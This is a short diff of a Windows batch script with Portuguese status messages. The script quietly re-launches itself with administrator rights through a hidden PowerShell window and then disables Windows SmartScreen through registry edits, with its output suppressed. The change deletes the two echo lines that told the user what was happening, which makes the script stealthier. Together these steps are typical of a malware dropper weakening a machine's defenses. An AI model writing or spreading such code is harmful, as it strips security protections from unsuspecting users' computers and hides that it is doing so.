@@ -8,13 +8,11 @@ if %errorlevel% neq 0 (
 )
 
 if "%~1"=="" (
-    echo [*] Executando sem elevação. Elevando...
     powershell -NoP -W Hidden -Command "Start-Process cmd -ArgumentList '/c \"\"%~f0\"\" --go' -Verb RunAs -WindowStyle Hidden"
     exit /b
 )
 
 :main
-echo [*] Desativando SmartScreen...
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
 
